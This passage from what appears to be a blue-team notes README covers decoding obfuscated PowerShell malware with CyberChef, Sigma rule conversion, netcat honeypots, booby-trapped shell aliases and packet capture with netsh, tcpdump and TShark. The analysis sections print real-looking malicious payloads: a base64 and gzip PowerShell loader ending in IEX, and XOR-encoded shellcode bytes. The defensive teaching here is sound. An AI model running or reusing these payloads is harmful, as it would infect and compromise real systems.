KwA3AEwAeABGAHcASgAzAG0AeABwAEUAZwBjADUASABRAHUAUABMAHgAUABTAFUAdABtADYAcABhAGIAcgA1AE4ASQB5AGwAaQBRAGcAQwB6ADgAbAByAHYAQgBBAFcAdQB1AEUASgBKAGMAMgBjAG0ANABkAHcAUwBSAGgAdAB4AGUAcABTAHIAcQBPAEIASABmAFkAVwA3AFgAVQBQAGUAMgBRAFAAegBCAHYAWAA4AHMAdgBlAEkARAA1AHgAcgAzAGMANgA1AGcAZwBuADMAWgBhADYAMgBEAFYAVQAxAFAAUgA3AGYAQwBBAG4AYgB0AHkAWgBSAGMAdwBZAGEAVABsAE4ANQBFAHIAZwA0ADIAWAAvAEIAcgB1AFIARwBjAGUARwBLADEAVgB0ADkATwBLAEYASgBUADgAdgArAEoAagBiAHYAWABiAGgANABXADUAaABGAHgAOAB0AGIAZQBRAHgAMwB2AEkANgBRAEUAOABXADQAVwBmAEQARwBpAGIASgBDAG4AawBXAEsAUgA2AGUAYQAxAHMAbABaADIAZgA0AGYAdABRAEkAbABLADAARgBXAEMAUAArAC8AUABCADAARgBnAEUAQwBkAG0AMwAvAEYAaABiAFgAaQBMAHoAVgBZAG0ANwBVAE8ATgBHAGoAMwA0AFIAQgB3AEcANwBoAHIAegBEAEMAMwBFAHkAMAA4AFcASgBNAHUANABsAGoAWQBtAFUARABnACsAeQBrAHIAdQA3AHYASQBOAHQAdgBCAEIAbQBrAGoAUgAvAHoALwArAEQAZwAvADgATABtADMARgB2AFAAUQBvADYARQB6AFMAOQAvAFAAegBMAGwAMgBvACsASwA3AHoAZABQAEoANgBuAFQANgBmAFoANwBtADEALwBZAGEAUQBnAGoAYgAvAE0AKwAxADEAeABzADAAUAB2AHUAdAB4AG4AQQA5AE0AUQBoAGQARQBMAHMAcQBIADcAdwBkAEIAegBlAG0AWABKAFgAaQBnAGYAUgA1AGUAUgBaACsAVQBjAGwAYwByAEgAMAAvAFkAcgBEAFYAMQBxAHcAeQBRAEsAcwArAHEAcAAwAFEAdQAyADcAZQBGADgAMgBQAHAAawA2AG8ASABSADcAegBDAFEAUABjAEUATABiAFEAWgBMAHYAdgBYAGgAcQBzAHEAOQBFAGMASwBFAGQAZgBEAEoAaQBEAGUAYgBZAGkAQQA1AGUAbgBpAGEAeQAwADYARQBYADcAKwB1AHcAYgAzAGEATwB4AEEASAAxAEQAWABaAFMANAAxAHIAcABIAHkAagAwAGMAagAvADIANAAxAHEANgBmAGQAaAA2AFgAcAArAFYAbgBrAFQAVgA4AHMASABzAG4AZQBXAHYATgBkAGsARgA1AHEAcQBSAC8AVABEADIASABYAG8ALwB6AEEAQQBQAHkAbgA5AHoAOQBEAG0ANABCAFUAegAzAFIAdAAwAGgAVQBFAGYANAAxAFUAdABsAGIAKwBWAFMAcwBxAEcAZQAzAGMAZQBXAFgAdgA0AFkAcQBFAEIAZAAxAFAAawBYAHMAUgBRAHkAQwA2ADIAbgBnAEcAZgBOADgAWAA3AHUAbgBLAE8AcQBwAHcAaQBMAGIAbAB6AHgAUAAzAGcATABzAEEAOQBJAGUASgBiADgASQAwAFQAbQBuAEgAKwA4AHUAWQBPAG4AMgB6AGYAdQBRAFIAWgBCADgAYgB2ADMASQBSAGkAQwBpAFAAMwBoAGUAbwBaAGsASwBVAFUAWgByAEIAYwBkAEMARQBrAEoANABhAHoAZgB3AEoAeQB0ADAANgBaAEEAdwA0AEEAQQBBAD0APQAiACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA==
```

#### Building on what we know
[We already discussed](#setup-cyberchef) how to set cyberchef.

But keep in mind, to make this work we need to remove human-readable text....if we do this, we may lose track of what powershell the malware is actually deploying. So it's a good idea to make extensive notes.

![image](https://user-images.githubusercontent.com/44196051/121336621-9c5f8780-c913-11eb-86b4-fcb43c5d5a58.png)

We get some interestng stuff here. First, we can see it goes to base64 AGAIN; second, we can see that gzip is being brought into the game

#### Magic
But let's pretend we didn't see the Gzip part of the script. Is there a way we can 'guess' what methods obfscuation takes?

Absolutely, the option is called Magic in CyberChef. It's a kind of brute forcer for detecting encoding, and then offering a snippet of what the text would look like decoded.

![image](https://user-images.githubusercontent.com/44196051/121337043-04ae6900-c914-11eb-8243-72b2945fdd90.png)

So take the base64 text from the script, and re-enter it by itself
![image](https://user-images.githubusercontent.com/44196051/121337257-417a6000-c914-11eb-95f3-5e4bf9527974.png)

We can turn the UTF option off now, and turn magic on. I tend to give it a higher intensive number, as it's all client-side resource use so it's as strong as your machine is!

![image](https://user-images.githubusercontent.com/44196051/121337381-62db4c00-c914-11eb-9dce-58f81df1924e.png)

Well looky here, we can see some human-readable text. So now we know to stack add gzip to our decoding stack in cyberchef. From Magic, just click the link of the particular decoding option it offers

![image](https://user-images.githubusercontent.com/44196051/121337595-9f0eac80-c914-11eb-9b8d-093ad936d68c.png)

#### Gzip and Xor

We're starting to get somewhere with this script! But we're gonna need to do some more decoding unfortunately.

![image](https://user-images.githubusercontent.com/44196051/121337938-f14fcd80-c914-11eb-9d6f-8b435b13cd6b.png)

There's something sneaky about this malware. It's using some encyrption....but we can break it with XOR

![image](https://user-images.githubusercontent.com/44196051/121338577-89e64d80-c915-11eb-9653-3943527edec2.png)

If we trial and error with the numbers and decimals, we can eventually start the cracking process

![image](https://user-images.githubusercontent.com/44196051/121338868-d893e780-c915-11eb-8f3c-869d24bd4185.png)

#### Defang
CyberChef has taken us as far as we can go. To find out what happens next, we need to run this on a test rig. But we need to de-fang all of the dangerous bits of this script.

[John Hammond](https://www.youtube.com/watch?v=SRfmBaZeVSQ), a security researcher and awesome youtuber, introduced me to the concept of replacing variables in malicious scripts. If you replace-all for the variable, you can introduce variables that are familiar.

So for this script:
```powershell

#original variable
$s==New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAA......

#changed
$bse64=New-Object IO.Me
```
It isn't much, but in a big long complicated script, changing variables helps keep track of what's going on.

After this, we need to make sure that running this script won't actually execute anything malicious on our system. We just want to see what it will do.

Remove `IEX` where you see it. Don't get rid of the brackets though.
![image](https://user-images.githubusercontent.com/44196051/122641878-d6910c00-d0ff-11eb-9486-850b65b38d6d.png)

Once you've de-fanged the script, you are alright to run it and will just print the output to the screen:
![image](https://user-images.githubusercontent.com/44196051/122642110-a5650b80-d100-11eb-8f6b-6d9f5b33515c.png)


#### A Layer Deeper
So CyberChef got us here, and we were limited there. So now let's de-fang this resulting script and see where they takes us

If we scroll around, we can see see some of the logic of the script. At the bottom, we see that it will execute the output of a variable as a Job, which we've [touched on before](#scheduled-jobs)

![image](https://user-images.githubusercontent.com/44196051/122642283-8fa41600-d101-11eb-8e3d-f4786027a562.png)

Let's remove the IEX at the bottom, and neutralise the job by commenting it out
![image](https://user-images.githubusercontent.com/44196051/122642412-37b9df00-d102-11eb-8be2-58be82b88062.png)

....to be continued!!!


### Bytes

Here's a seperate bit of Powershell malware. I decoded it up to a point, and I want to focus on some easy ways to decode BYTES. 

```powershell
If ([IntPtr]::size -eq 8) {
  [Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbKsCMjI3lrquJim5giIyNuEupicmJySSBicmKZdKq85dz2yFp4a6riaxLxaqr7bhLqcUsjEeOncXFimch2DRjc9muq5Wug4HNJKXxrqtKZPCMjI0kjS6MQIyNqqsNimicjIyNimVZlvaXc9muq0muq+Wrk49zc3NxuEupxcWKZDiU7WNz2puMspr4iIyNr3Owsp68iIyPIkMrHIiMjy6Hc3NwMQlNKDFURDERGV3xLRkJHRlEcVlZKRx4QQhEQQkcTQQ4QQhsXDhcVQkUOQRRARw5AFkAWFRIbFBtGRhMjQEI91OUC8tO7DI3t7FEHxV0CI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxITDRMYA3RKTUdMVFADbXcDFQ0RGAN0bHQVFxgDd1FKR0ZNVwwVDRMYA25id2FpcAouKSMOmn/nY6mYOw5OQVNyftKp9hpItf3rAbs0ProvN/ccyuALAatbGBGOWJ2NY+zQ/glsuFaoh0pqIXHzPcoRtOWLPDHqUFS735Fjso5bxJ9e8WkKLcJfw5i/lpyFM60nu4hpKQz2ElgTcYb6/ce+ekpvIrjtcwE3LAHdTvge4DGT6u006lHMLUmGLrhFP/5fdz80Zw2UZezRXANuIpdmpZ4GKmmgJReSqSlU+E+oZhALFm+qEsWFRJxs0Un+JOkQGqMtlgRAcHDF93uo/DzGDM8myCNindOWgXXc9msS6pkjI2MjYpsjMyMjYppjIyMjYpl7h3DG3PZrsHBwa6rEa6rSa6r5YpsjAyMjaqraYpkxtarB3PZroOcDpuNXlUWoJGsi4KbjVvR7e3trJiMjIyNz4Mtc3tzcEhsWDRIaGw0WFA0SFhYjMRd1Ww==')

  for ($x = 0; $x -lt $var_code.Count; $x++) {
    $var_code[$x] = $var_code[$x] -bxor 35
  }
}
```

First, push it as a $variable in powershell

```powershell
$malware = [put the above string here]
```
<img width="890" alt="Screenshot 2022-01-18 at 13 40 33" src="https://user-images.githubusercontent.com/44196051/149948196-8705d331-4a1a-4f17-811e-af69928b29db.png">

If we `echo $malware" we can see we get some numbers. These are likely bytes. 

<img width="406" alt="Screenshot 2022-01-18 at 13 41 34" src="https://user-images.githubusercontent.com/44196051/149948344-e014b6c6-0878-48a5-a3af-bb7805845f28.png">

We can push these bytes straight into an .exe

```powershell
[System.IO.File]::WriteAllBytes(".\evil.exe", $malware)
```

Then we can string the evil.exe, and we can see that it includes a bad IP, confirming this was indeed malware!

<img width="653" alt="Screenshot 2022-01-18 at 13 45 52" src="https://user-images.githubusercontent.com/44196051/149949086-888afd9b-8de6-415c-949c-c8ffbb78d0b4.png">



# SOC

## Sigma Converter

The TL;DR of [Sigma](https://github.com/SigmaHQ/sigma) is that it's awesome. I won't go into detail on what Sigma is, but I will tell you about an awesome tool that lets you convert sigma rules into whatever syntax your SOC uses: [Uncoder](https://uncoder.io/) 

You can convert ONE standard Sigma rule into a range of other search syntax languages automatically
![image](https://user-images.githubusercontent.com/44196051/120665902-16ab8a00-c484-11eb-992d-621decf78a0c.png)

### Uncoder Example: Colbalt Strike

Here, we can see that a sigma rule for CS process injection is automtically converted from a standard sigma rule into a *Kibana Saved Search*

![image](https://user-images.githubusercontent.com/44196051/120666031-2a56f080-c484-11eb-907c-dad340bade0f.png)

---

## SOC Prime

[SOC Prime](https://tdm.socprime.com/) is a market place of Sigma rules for the latest and greatest exploits and vulnerabilities

![image](https://user-images.githubusercontent.com/44196051/120675327-def51000-c48c-11eb-8dcf-a07b98288661.png)

You can pick a rule here, and convert it there and then for the search langauge you use in your SOC

![image](https://user-images.githubusercontent.com/44196051/120675130-b66d1600-c48c-11eb-9377-27098fce2283.png)

---

# Honeypots

One must subscribe to the philosophy that compromise is inevitable. And it is. As Blue Teamers, our job is to steel ourselves and be ready for the adversary in our network. 

Honeypots are *advanced* defensive security techniques. Much like a venus flytrap that seeks to ensnare insects, a honeytrap seeks to ensare the adversary in our network. The task of the honeypot is to allure the adversary and convince them to interact. In the mean time, our honeypot will alert us and afford us time to contain and refute the adversary - all the while, they were pwning a honeypot they believed to be real but in fact did not lasting damage.

Look, there isn't anything I could teach you about honeypots that Chris Sanders couldn't teach you better. Everything you and I are gonna talk about in the Blue Team Notes to do with Honeypots, [Chris Sanders could tell you and tell you far better](https://chrissanders.org/2020/09/idh-release/). But for now, you're stuck with me!

<details>
    <summary>section contents</summary>

  + [Basic Honeypots](#basic-honeypots)
    - [Telnet Honeypot](#telnet-honeypot)
    - [HTTP Honeypot](#http-honeypot)
    - [Booby Trap Commands](#booby-trap-commands)
  
</details>

## Basic Honeypots

An adversaries' eyes will light up at an exposed SSH or RDP. Perhaps it's not worth your time having an externally-facing honeypot (adversaries all over the world will brute force and try their luck). But in your internal network, emulating a remote connection on a juicy server may just do the trick to get the adversary to test their luck, and in doing so notify you when they interact with the honeypot

### Telnet Honeypot
WHOMST amongst us is using telnet in the year of our LORDT 2021?!.....a shocking number unfortunately....so let's give a honeypot telnet a go!

On a linux machine, set this fake telnet up with netcat. Also have it output to a log, so you are able to record adversaries' attempts to exploit. 

You can check in on this log, or have a cronjob set up to check it's contents and forward it to you where necessary

```bash
ncat -nvlkp 23 > hp_telnet.log 2>&1
# -l listen mode, -k force to allow multiple connections, -p listen on
# I added a dash V for more info

#test it works!
#an attacker will then use to connect and run commands
telnet 127.0.0.1 
whoami
#netcat willl show what the attacker ran. 
```
If you run this bad boy, you can see that the .LOG captures what we run when we telnet in. The only downside of this all of course is we do not have a real telnet session, and therefore it will not speak back to the adversary nor will it keep them ensnared.

![image](https://user-images.githubusercontent.com/44196051/125678062-042db1f2-d013-4167-8bb9-a28c9cf56a7b.png)


### HTTP Honeypot

Our fake web server here will ensnare an adversary for longer than our telnet. We would like to present the webserver as an 'error' which may encourage the adversary to sink time into making it 'not error'.

In the mean time, we can be alerted, respond, gather information like their user agent, techniques, IP address, and feed this back into our SOC to be alerted for in the future. 


First, you will need a `index.html` file. Any will do, I'll be [borrowing this one](view-source:https://httperrorpages.github.io/HttpErrorPages/HTTP403.html)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>We&#39;ve got some trouble | 403 - Access Denied</title>
    <style type="text/css">/*! normalize.css v5.0.0 | MIT License | github.com/necolas/normalize.css */html{font-family:sans-serif;line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figcaption,figure,main{display:block}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}a:active,a:hover{outline-width:0}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:inherit}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}dfn{font-style:italic}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}audio,video{display:inline-block}audio:not([controls]){display:none;height:0}img{border-style:none}svg:not(:root){overflow:hidden}button,input,optgroup,select,textarea{font-family:sans-serif;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{display:inline-block;vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details,menu{display:block}summary{display:list-item}canvas{display:inline-block}template{display:none}[hidden]{display:none}/*! Simple HttpErrorPages | MIT X11 License | https://github.com/AndiDittrich/HttpErrorPages */body,html{width:100%;height:100%;background-color:#21232a}body{color:#fff;text-align:center;text-shadow:0 2px 4px rgba(0,0,0,.5);padding:0;min-height:100%;-webkit-box-shadow:inset 0 0 100px rgba(0,0,0,.8);box-shadow:inset 0 0 100px rgba(0,0,0,.8);display:table;font-family:"Open Sans",Arial,sans-serif}h1{font-family:inherit;font-weight:500;line-height:1.1;color:inherit;font-size:36px}h1 small{font-size:68%;font-weight:400;line-height:1;color:#777}a{text-decoration:none;color:#fff;font-size:inherit;border-bottom:dotted 1px #707070}.lead{color:silver;font-size:21px;line-height:1.4}.cover{display:table-cell;vertical-align:middle;padding:0 20px}footer{position:fixed;width:100%;height:40px;left:0;bottom:0;color:#a0a0a0;font-size:14px}</style>
</head>
<body>
    <div class="cover"><h1>Access Denied <small>403</small></h1><p class="lead">The requested resource requires an authentication.</p></div>
    <footer><p>Technical Contact: <a href="mailto:larry@honeypot.com">larry@honeypot.com</a></p></footer>
</body>
</html>
```

Second, we now need to set up our weaponised honeypot. Here's a bash script to help us out: 

```bash
#!/bin/bash

#variables
PORT=80
LOG=hpot.log
#data to display to an attcker
BANNER=`cat index.html` # notice these are ` and not '. The command will run incorrectly if latter

# create a temp lock file, to ensure only one instance of the HP is running
touch /tmp/hpot.hld
echo "" >> $LOG
#while loop starts and keeps the HP running. 
while [ -f /tmp/hpot.hld ]
 do
  echo "$BANNER" | ncat -lvnp $PORT 1>> $LOG 2>> $LOG
  # this section logs for your benefit
  echo "==ATTEMPTED CONNECTION TO PORT $PORT AT `date`==" >> $LOG # the humble `date` command is great one ain't it
  echo "" >> $LOG
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" >> $LOG # seperates the logged events. 
 done
```

Test this locally by examining 127.0.0.1 in your browser, your .LOG file should have a FIT over this access and record much of your attempts to do something naughty, like brute forcing ;)

![image](https://user-images.githubusercontent.com/44196051/125679908-3a35b8c7-f9c3-4c1b-9c37-df9382a52d18.png)


### Booby Trap Commands

`alias` in Linux is awesome, it lets you speed up your workflow by setting shortcuts for the longer commands and one-liners you know and love.....Alias can also be weaponised in aid of the defender.

Why don't we backdoor some naighty commands that adversaries like to use on 'Nix machines. Off the top of my head, we can boobytrap `nano`, `base64`, `wget` and `curl`, but you'll think of something more imaginative and clever, I am sure.


```bash
#IRL
alias wget ='curl http://honey.comands.uk/$(hostname -f) > /dev/null 2>&1 ; wget'
# Hostname -f will put the fully qualified domain name of the machine into the GET request to our listening web server
  #ideally, the website you first hit be a cloud instance or something. Don't actually use 127.0.0.1
    # the reason we ask it to curl the machine name directory is to alert OUR listener of the specific machine being attacked by the adversary


#for testing
  # I am hardcoding the machine name in the directory as an example. If I were you, I'd keep the FQDN above
alias wget='curl http:/127.0.0.1/workstation1337 > /dev/null 2>&1 ; wget'

# Notice the ;wget at the end
  # this will still execute wget without any worries
  # However it comes after the curl to our listening honeypot detector
  # The honeypot detector's output is pushed to the abyss, so it will not alert the adversary
```

If we have a listening web server in real life, it will snitch on the adversary trying to use WGET. This is true for any of the other commands we do too

![image](https://user-images.githubusercontent.com/44196051/125682635-8d0be115-8f04-4f07-8009-eee8ea6b1cc2.png)
![image](https://user-images.githubusercontent.com/44196051/125682915-cd9f8bee-3ece-470f-a74f-3ca8c3c35425.png)

---


# Network Traffic

I'll be honest with you. Network traffic is where it's at. Endpoints and their logs are fallible, they can be made to LIE to you by an adversary. But packets? Packet's don't lie.

There's a great [SANS talk](https://www.sans.org/webcasts/packets-didnt-happen-network-driven-incident-investigations-119100) and [corresponding paper](https://www.sans.org/reading-room/whitepapers/analyst/membership/40300), called _Packets or it Didn't Happen_,  all about the utility of network traffic's advantadges over endpoint log monitoring. 

<details>
    <summary>section contents</summary>

  + [Capture Traffic](#capture-traffic)
  + [TShark](#tshark)
  + [Extracting Stuff](#extracting-stuff)
  + [PCAP Analysis IRL](#pcap-analysis-irl)
  
</details>


---

## Capture Traffic

<details>
    <summary>section contents</summary>

  + [Packet Versions](#packet-versions)
    - [Pcapng or Pcap](#pcapng-or-Pcap)
    - [ETL](#etl)
  + [Capture on Windows](#capture-on-windows)
    - [Preamble](#preamble)
    - [netsh trace ](#netsh-trace)
    - [Converting Windows Captures](#converting-windows-captures)
  + [Capture on 'Nix](#capture-on-'nix)
    - [Preperation](#preperation)
    - [Outputting](#outputting)
      - [I want PCAPNG](#I-want-PCAPNG)
      - [Doing interesting things with live packets](#Doing-interesting-things-with-live-packets)

  
</details>

When we're talking about capturing traffic here, we really mean capturing traffic in the form of packets. 

But it's worth taking a smol digression to note what implementing continuous monitoring of traffic means in your environment

To capture continuous traffic, as well as to capture it in different formats like Netflow & metadata, you will need to install physical sensors, TAPS, and the like upstream around your network. You will also need to leverage DNS server traffic, internal firewall traffic, and activity from routers/switches especialy to overcome VLAN segregation.

Network traffic monitoring uses particular terms to mean particular things
* North to South monitoring = monitoring ingress and egress traffic = stuff that's coming in external to your domain and stuff that's leaving your domain out to the big bad internet
* East to West monitoring = monitoring communication between machines in the Local Area Network = stuff that your computers talking about with one another.

I really encourage you to read and watch [the SANS](#Network-Traffic) stuff on this topic. 


### Packet Versions

Listen buddy, I'll have you know we base things on SCIENCE around here. And the SCIENCE says that not all packet capture file types are born equal.

We'll only focus on the most commonly encountered ones

#### Pcapng or Pcap
According to a [SANS research paper](https://www.sans.org/reading-room/whitepapers/detection/paper/38335) on the matter, *pcapng* is the superior packet we should strive for compared to pcap
 
PCAP Next Generation (PCAPng) has some advantadges over it's predecessor, PCAP. It's explicit goal is to IMPROVE on pcap
* More granular timestamps
* More metadata
* Stats on dropped packets

Unfortunately, Pcapng isn't popular. Not many tools can output a pcacpng file or use it as default. Most tools can read it just fine though, so that's a big plus. Fortunately for you and I, Wireshark and Tshark use Pcapng as their default output for captured packets and therefore we can still leverage this New Generation.

If you want to write in pcapng, you can read about it (here)[#I-want-pcapng] in the Blue Team Notes

#### ETL

ETL isn't quite the Windows implementation of a Pcap. 

According to the [docs](https://docs.microsoft.com/en-us/windows/win32/ndf/network-tracing-in-windows-7-architecture), ETLs (or Event Trace Logs) are based on the ETW framework (Event Tracing for Windows). ETW captures a number of things, and when we leverage network monitoring in windows we are simply leveraging one of the many things ETW recognises and records in ETL format.

We don't need to over complicate it, but essentially .ETLs are records of network activity taken from the ETW kernel-level monitor. 

It is possible to convert .ETL captured network traffic over to .Pcap, which we talk about [here](#Converting-Windows-Captures) in the Blue Team Notes


### Capture on Windows
#### Preamble

Weird one to start with right? But it isn't self evident HOW one captures traffic on Windows

You COULD download [Wireshark for Windows](https://www.wireshark.org/download.html), or [WinDump](https://www.winpcap.org/windump/), or [Npcap](https://github.com/nmap/npcap). If you want to download anything on a Windows machine, it's a tossup between Wireshark and [Microsoft's Network Monitor](https://docs.microsoft.com/en-us/windows/client-management/troubleshoot-tcpip-netmon)

#### Netsh Trace

But to be honest, who wants to download external stuff??? And who needs to, when you can leverage cmdline's [`netsh`](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj129382(v=ws.11)#using-filters-to-limit-etl-trace-file-details)

We can look at our options by running the following
```cmd
netsh trace start ?
```
![image](https://user-images.githubusercontent.com/44196051/123682218-a30e5a00-d842-11eb-80e2-5663d48d4ee7.png)

We're only concerned with a handful of these flags
* `capture=yes` - actually capture packets
* `capturetype=x` - default is physical option, other option is virtual
* `maxSize=0` - otherwise the max size is only 250mb
* `filemode=single` - a requirement if we have unlimited capture size
* `traceFile=C:\temp\captured_traffic.etl` - location and name to store captured info
* `level=5` - the verbosity we would like our packets to be collected with

So our most basic command looks like the following
```cmd
:: run as admin
netsh trace start capture=yes maxSize=0 filemode=single tracefile=C:\captured_traffic.etl level=5

:: to stop 
netsh trace stop
:: will take a while now!
```

![image](https://user-images.githubusercontent.com/44196051/123683459-1ebcd680-d844-11eb-9573-2d6e61d1c9c0.png)

#### Converting Windows Captures
The astute will have noted that files that end in .ETL are not .PCAP. For reasons I don't know, Microsoft decided to just not save things as Pcap? I don't know man.

At any rate, we can convert it to a format we all know and love.

To convert it on windows, we have to download something I am afraid. Forgive me. [etl2pcapng](https://github.com/microsoft/etl2pcapng)

```cmd

:: example usage
etl2pcapng.exe original.etl converted.pcapng

:: etl2pcapng.exe captured_traffic.etl converted_captured_traffic.pcapng
```
![image](https://user-images.githubusercontent.com/44196051/123687593-03a09580-d849-11eb-8848-922276a02fc7.png)

And if we look on a linux machine, we can confirm it's a PCAP alright
![image](https://user-images.githubusercontent.com/44196051/123688260-b53fc680-d849-11eb-8159-cda05b8210bc.png)

![image](https://user-images.githubusercontent.com/44196051/123688630-28493d00-d84a-11eb-9f37-bc004b9783be.png)

### Capture on 'Nix

Big old assertion coming up: generally speaking, if a system is unix-based (so BSD, Linux, and macOS) then they will likely have `tcpdump` installed and therefore are all good to capture PACKETS.

You'll need to run `sudo` in front of tcpdump, or run it as root. 

#### Preperation

Tcpdump can listen to a LOT....too much actually. So we need to help it out by offering a particular network _interface_. To see all of the interface options we can give to tcpdump, you can use the following command which will uniquely look at your local system and throw up the options

```bash
#list interfaces
tcpdump -D

#interfaces are later fed in like so
tcpdump -i interface_option
```

![image](https://user-images.githubusercontent.com/44196051/123689836-96daca80-d84b-11eb-9f72-d78d88cb9af7.png)

Perchance you only want to capture particular traffic from particular Protocols Ports, and IPs. It's surprisingly easy to do this

```bash
tcpdump -i x tcp port 80

#or
tcpdump -i x host 10.10.10.99
```
![image](https://user-images.githubusercontent.com/44196051/123690653-8119d500-d84c-11eb-9762-177640706fe4.png)



#### Outputting

To just save your pcap, output with the `-w` flag
```bash
tcpdump -i x -w traffic.pcap
```
You can now take that over to the [TShark](#tshark) section of the Blue Team Notes for some SERIOUS analysis.
![image](https://user-images.githubusercontent.com/44196051/123691306-5d0ac380-d84d-11eb-8358-00c19e7e7c56.png)


##### I want PCAPNG

Earlier, we spoke about how [PCAPNG is superior to PCAP](#Pcapng-or-Pcap)

In TShark, pcapng is the default file format. TShark shared many of the same flags as tcpdump, so we don't need to go over that in too much detail. 

To be sure you're writing a pcapng format, use the `-F` flag

```bash
tshark -i wlan0 -F pcapng -W captured_traffic.pcapng
```

##### Doing interesting things with live packets

Say you turn around, look me dead in the eye and say "PCAP analysis here, now, fuck TShark". It is possible to do some interesting things with live packet inspection as the packets come in. 

First, we'll need to attach the `--immediate-mode` flag for these all. Usually, tcpdump buffers the writing of packets so as not to punish the OS' resource. But seeing as we're printing live and not saving the packets, this does not concern us. 

We can print the ASCII translation of the info in the packets. In the screenshot below, you can see the first half is run without ASCII and the second is run with ASCII. Comes out messy, but may prove useful one day?

```bash
tcpdump -i any -A --immediate-mode

###if you want to drive yourself crazy, add -vvv
```
![image](https://user-images.githubusercontent.com/44196051/123691937-1ec1d400-d84e-11eb-964f-30b46cd0b2f9.png)


You can also be verbose af!
```bash
tcpdump -i any -vvv --immediate-mode
```
![image](https://user-images.githubusercontent.com/44196051/123692129-5a5c9e00-d84e-11eb-893e-d18480451c27.png)

You can also print helpful things live like different time formats as well as packet numbers
```bash
#packet numbers
sudo tcpdump -i any --immediate-mode --number

## different time format
sudo tcpdump -i any --immediate-mode -tttt
```
![image](https://user-images.githubusercontent.com/44196051/123693205-b247d480-d84f-11eb-9528-35d93dc973b1.png)

Only print a number of packets. You can use the `-c` flag for that
```bash
sudo tcpdump -i any -c 1 
#only collect one packet and then stop. You can change to any number
```
![image](https://user-images.githubusercontent.com/44196051/123693404-e8855400-d84f-11eb-821f-f108496eaec4.png)

---

## TShark

<details>
    <summary>section contents</summary>

  + [Add](#add)
    - [Add Colour](#add-colour)
    - [Add Time](#add-time)
    - [Add Space](#add-space)
    - [Add Readable Detail](#add-readable-detail)
    - [Get Specific Packet](#get-specific-packet)
    - [Ideal base for any TShark command](#ideal-base-for-any-tshark-command)
  + [Change Format of Packet](#change-format-of-packets)
    - [Get format options](#get-format-options)
      - [Prepare for Elastic](#prepare-for-elastic)
      - [Tabs](#tabs)
      - [Other Formats](#other-formats)
  + [Filtering](#filtering)
    - [Glossary](#glossary)
    - [By Protocol](#by-protocol)
    - [By IP](#by-ip)
    - [Using DisplayFilters](#using-displayfilters)
      - [Removing info around DisplayFilters](#removing-info-around-displayfilters)
  + [Stats](#stats)
    - [Get Conversations](#get-conversations)
      - [IP Conversations](#ip-conversations)
      - [DHCP Conversations](#dhcp-conversations)
        - [DNS Conversations](#dns-conversations)
        - [DHCP Details](#dhcp-details)
      - [SIP Conversations](#sip-conversations)
      - [Stats on Protocols Involved in Traffic](#stats-on-protocols-involved-in-traffic)
      - [Filter Between Two IPs](#filter-between-two-Ips)
    - [HTTP](#http)
      - [Resolve Hosts](#resolve-hosts)
      - [Find User Agents](#find-user-agents)
      - [Get MAC Addresses](#get-mac-addresses)
      - [Decrypt TLS traffic](#decrypt-tls-traffic)
        - [Decrypt TLS traffic](#decrypt-tls-traffic)
        - [Sanity Check the Key is working](#Sanity-Check-the-Key-is-working)
